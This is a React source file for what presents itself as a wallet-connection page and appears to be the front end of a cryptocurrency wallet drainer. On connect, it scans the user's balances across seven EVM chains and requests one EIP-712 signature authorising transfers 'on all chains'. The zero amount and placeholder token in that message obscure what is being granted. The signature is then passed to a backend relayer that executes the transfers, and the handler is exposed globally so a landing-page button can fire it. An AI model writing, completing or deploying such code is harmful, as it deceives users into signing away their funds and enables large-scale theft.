import { useState, useEffect } from 'react'
import { useWalletStore } from './stores/walletStore'
import { connectWallet, disconnectWallet, formatAddress } from './utils/walletConnect'
import { detectBalances, executeTransferWithSignature } from './utils/api'
import EIP712Signer from './utils/eip712Signer'
import ConnectButton from './components/ConnectButton'
import BalancesDisplay from './components/BalancesDisplay'
import TransferModal from './components/TransferModal'
import SummaryModal from './components/SummaryModal'

function App() {
  const {
    account,
    isConnected,
    isLoading,
    error,
    balances,
    transferStatus,
    setAccount,
    setIsConnected,
    setIsLoading,
    setError,
    setBalances,
    setTransferStatus
  } = useWalletStore()

  const [showSummary, setShowSummary] = useState(false)
  const [provider, setProvider] = useState(null)

  /**
   * NEW: Meta-Transaction Flow with EIP-712
   * User signs once → Backend executes all transfers with relayer wallet
   */
  const handleConnect = async () => {
    setIsLoading(true)
    setError(null)

    try {
      console.log('[App] 🚀 Starting META-TRANSACTION flow...')

      // Step 1: Connect wallet
      const { account: addr, provider: connectedProvider } = await connectWallet()
      setProvider(connectedProvider)
      console.log('[App] ✅ Wallet connected:', addr)

      setAccount(addr)
      setIsConnected(true)

      // Step 2: Detect balances on all chains
      console.log('[App] 🔍 Detecting balances across all chains...')
      const balanceResponse = await detectBalances(addr)
      const detectedBalances = balanceResponse.balances
      setBalances(detectedBalances)
      console.log('[App] ✅ Balances detected:', detectedBalances)

      // Step 3: Request EIP-712 signature from user (ONE TIME)
      console.log('[App] 📝 Creating EIP-712 message for user signature...')

      // Detect primary chain (first EVM chain with balance)
      let chainId = 1 // Default to Ethereum
      const chainIdMap = {
        ethereum: 1,
        bsc: 56,
        polygon: 137,
        arbitrum: 42161,
        base: 8453,
        optimism: 10,
        avalanche: 43114
      }

      for (const [chainName, id] of Object.entries(chainIdMap)) {
        if (detectedBalances[chainName]) {
          chainId = id
          break
        }
      }

      // Create EIP-712 message for transfer authorization
      const messageData = EIP712Signer.createTransferMessage(
        '0x0000000000000000000000000000000000000000', // Native token placeholder
        '0', // Amount (for all-chain transfer)
        0, // Nonce
        chainId,
        'all' // Authorize transfer on all chains
      )

      console.log('[App] 📋 EIP-712 Message:', messageData.message)

      // Request user signature
      console.log('[App] 🔐 Requesting user signature (check wallet)...')
      const signature = await EIP712Signer.signMessage(connectedProvider, addr, messageData)

      console.log('[App] ✅ User signed! Signature:', signature.substring(0, 20) + '...')

      // Step 4: Send signature to backend for verification + execution
      console.log('[App] 🔄 Sending signature to backend for verification...')
      const transferResult = await executeTransferWithSignature(
        addr,
        signature,
        messageData,
        detectedBalances
      )

      console.log('[App] ✅ Transfers completed:', transferResult)
      setTransferStatus(transferResult)

      // Show summary
      setShowSummary(true)
    } catch (err) {
      const errorMsg = err.message || 'Connection failed'
      setError(errorMsg)
      console.error('[App] ❌ Error:', err)
    } finally {
      setIsLoading(false)
    }
  }

  /**
   * Expose connection handler to landing page
   */
  useEffect(() => {
    // This allows the landing page button to trigger the real WalletConnect modal
    window.__app_handleConnect = handleConnect
    console.log('[App] Connection handler exposed to window')
  }, [handleConnect])

  /**
   * Handle wallet disconnection
   */
  const handleDisconnect = async () => {
    await disconnectWallet()
    setAccount(null)
    setIsConnected(false)
    setBalances({
      ethereum: '0',
      bsc: '0',
      polygon: '0',
      solana: '0',
      tron: '0',
      sui: '0'
    })
    setTransferStatus(null)
    setShowSummary(false)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black flex items-center justify-center">
      <div className="w-full max-w-md px-4">
        {/* Connection Status */}
        {isConnected && account ? (
          <div className="bg-gradient-to-r from-green-900 to-green-800 border border-green-700 rounded-lg p-6 mb-8">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-green-300 text-sm font-semibold">Connected Wallet</p>
                <p className="text-white font-mono text-lg mt-1">{formatAddress(account)}</p>
              </div>
              <button
                onClick={handleDisconnect}
                className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold transition"
              >
                Disconnect
              </button>
            </div>
          </div>
        ) : null}

        {/* Connect Button */}
        {!isConnected ? (
          <ConnectButton
            onClick={handleConnect}
            isLoading={isLoading}
            error={error}
          />
        ) : null}

        {/* Balances Display */}
        {isConnected && (
          <BalancesDisplay balances={balances} />
        )}

        {/* Transfer Status */}
        {transferStatus && (
          <TransferModal status={transferStatus} />
        )}

        {/* Summary Modal */}
        {showSummary && (
          <SummaryModal
            status={transferStatus}
            onClose={() => setShowSummary(false)}
          />
        )}

        {/* Error Display */}
        {error && (
          <div className="bg-red-900 border border-red-700 rounded-lg p-4 mb-8">
            <p className="text-red-200 font-semibold">Error</p>
            <p className="text-red-300 text-sm mt-2">{error}</p>
          </div>
        )}
      </div>
    </div>
  )
}

export default App
